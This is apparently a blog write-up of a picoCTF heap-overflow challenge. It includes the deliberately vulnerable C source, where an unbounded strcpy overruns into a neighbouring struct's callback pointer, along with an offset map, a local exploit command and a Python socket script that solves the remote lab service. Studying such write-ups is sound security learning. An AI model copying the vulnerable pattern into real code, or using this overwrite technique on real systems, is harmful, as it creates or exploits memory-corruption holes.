---
layout: post
title: "picoCTF: heap - Heap Overflow into an Adjacent Struct's Callback"
date: 2026-06-03
tags: [pwn]
---

## Challenge Overview

| Property | Value |
|---|---|
| Binary | `heap` (ELF32, Intel i386, dynamically linked, not stripped) |
| Category | Binary Exploitation / pwn |
| Protections | No PIE · No canary · NX on · Partial RELRO |
| Remote | `nc foggy-cliff.picoctf.net 60198` |

Source code (`heap.c`) was provided. Tagline: *"Make no Mistake."* Goal: redirect
execution into `winner()`, which reads and prints `flag.txt`.

## The Source

```c
struct internet {
    int priority;
    char *name;
    void (*callback)();
};

void winner() {
    FILE *fp;
    char flag[256];
    fp = fopen("flag.txt", "r");
    if (fp == NULL) { perror("Error opening flag.txt"); exit(1); }
    if (fgets(flag, sizeof(flag), fp) != NULL)
        printf("FLAG: %s\n", flag);
    else
        printf("Error reading flag\n");
    fclose(fp);
}

int main(int argc, char **argv) {
    struct internet *i1, *i2, *i3;
    printf("Enter two names separated by space:\n");
    fflush(stdout);
    if (argc != 3) { printf("Usage: ./vuln <name1> <name2>\n", argv[0]); return 1; }

    i1 = malloc(sizeof(struct internet));
    i1->priority = 1;
    i1->name = malloc(8);
    i1->callback = NULL;

    i2 = malloc(sizeof(struct internet));
    i2->priority = 2;
    i2->name = malloc(8);
    i2->callback = NULL;

    strcpy(i1->name, argv[1]);   // <-- VULN: no bounds check, 8-byte dst
    strcpy(i2->name, argv[2]);

    if (i1->callback) i1->callback();
    if (i2->callback) i2->callback();

    printf("No winners this time, try again!\n");
}
```

## Vulnerability Analysis

The program never calls `winner()` on its own — the normal path dead-ends at *"No winners
this time, try again!"*. But notice each `internet` struct carries a `callback` function
pointer that gets invoked **if it is non-NULL**:

```c
if (i1->callback) i1->callback();
if (i2->callback) i2->callback();
```

Both callbacks are initialized to `NULL`, so neither fires under normal conditions. Our
entire job is to make one of them equal the address of `winner()`.

The bug that lets us do it:

```c
strcpy(i1->name, argv[1]);   // 8-byte heap buffer, attacker-controlled source, no length check
```

`argv[1]` is fully under our control, and `i1->name` points at a heap buffer `malloc(8)`
handed us — with no bounds check, this is a textbook **heap buffer overflow**.

### Why the neighbor gets clobbered

Unlike a stack overflow that smashes a saved return address, a heap overflow corrupts
whatever allocation sits *after* the one you overran. Here the four allocations land
consecutively in the 32-bit glibc heap (each chunk is 16 bytes total / 12 usable, with a
4-byte chunk header between them):

```
[ i1 struct ][ i1->name buf ][ i2 struct ][ i2->name buf ]
                  ^overflow source           ^
                  |__________ reaches into i2 struct ______|
```

By writing past the end of `i1->name`, we walk forward through the `i2` chunk header,
through `i2->priority` and `i2->name`, and land on `i2->callback`. The very next line —
`if (i2->callback) i2->callback();` — then jumps wherever we pointed it.

### Offset map (from the start of the `i1->name` buffer)

| Offset | Size | Overwrites | Value we write |
|---:|---:|---|---|
| 0–11 | 12 | `i1->name` usable bytes | padding (`A`×12) |
| 12–15 | 4 | `i2` chunk header | padding (`A`×4) |
| 16–19 | 4 | `i2->priority` | padding (`A`×4) |
| 20–23 | 4 | `i2->name` pointer | `0x0804c038` (writable) |
| 24–27 | 4 | **`i2->callback`** | **`0x080492b6` (`winner`)** |

Two details make this clean:

1. **`winner` has a fixed address.** The binary is compiled **No PIE**, so `winner` lives at
   a statically known `0x080492b6` — no leak, no ASLR defeat, just hardcode it.
2. **Don't crash on the second `strcpy`.** We just overwrote `i2->name` with a pointer of our
   choosing, and the program is about to run `strcpy(i2->name, argv[2])`. If we left garbage
   there it would dereference an invalid pointer and segfault *before* reaching the callback.
   So we aim `i2->name` at the writable `.data` section (`0x0804c038`), giving that second
   copy a harmless place to write.

## Transport Constraint

The remote wrapper reads a **single line** and splits it on a space into `argv[1]` and
`argv[2]`. That means the payload must contain **no null bytes and no spaces** — otherwise
the line gets cut short or split in the wrong place. Both target addresses
(`0x0804c038`, `0x080492b6`) are space-free and null-free, so we're fine. The single space we
*do* include is the deliberate `argv[1] | argv[2]` separator.

## Exploitation

### Local verification

```bash
echo "picoCTF{local_test_flag}" > flag.txt
./heap "$(printf 'AAAAAAAAAAAAAAAAAAAA8\xc0\x04\x08\xb6\x92\x04\x08')" x
# -> FLAG: picoCTF{local_test_flag}
```

The 20 `A`s fill offsets 0–19, then `\x38\xc0\x04\x08` (`0x0804c038`) overwrites `i2->name`
and `\xb6\x92\x04\x08` (`0x080492b6`) overwrites `i2->callback`. The trailing `x` is just a
non-empty `argv[2]`.

### Remote solve (plain sockets, no pwntools)

```python
import socket, struct, time

def p32(x): return struct.pack("<I", x)

winner   = 0x080492b6   # winner() — known because the binary is No-PIE
writable = 0x0804c038   # .data, scratch for the clobbered i2->name

arg1 = b"A"*20 + p32(writable) + p32(winner)
payload = arg1 + b" x\n"     # wrapper splits the line on the space into argv[1], argv[2]

s = socket.create_connection(("foggy-cliff.picoctf.net", 60198), timeout=10)
time.sleep(0.5)
s.sendall(payload)
s.settimeout(5)
data = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk: break
        data += chunk
except socket.timeout:
    pass
print(data.decode(errors="replace"))
```

### Output

```
Enter two names separated by space:
FLAG: picoCTF{h34p_0v3rfl0w_7bb56fe9}
No winners this time, try again!
```

**Flag:** `picoCTF{h34p_0v3rfl0w_7bb56fe9}`

## Key Takeaways

1. **Heap overflows corrupt *adjacent allocations*, not return addresses.** The prize here was
   a neighboring struct's function pointer, reached by overrunning an 8-byte `name` buffer.
2. **No PIE is a gift.** Fixed load addresses meant `winner` could be hardcoded with zero
   information leaks.
3. **If you overwrite a pointer the program will later dereference, aim it somewhere valid.**
   Pointing the clobbered `i2->name` at writable `.data` kept the program alive long enough to
   reach the callback instead of segfaulting on the second `strcpy`.
4. **Mind the transport.** The remote splits input on a space, so the payload had to stay free
   of null bytes and spaces — a constraint that shaped which addresses were usable.
5. **The tagline says it all.** *"Make no Mistake"* points straight at the off-by-design
   `strcpy` with no bounds check — one missing check is the entire bug.
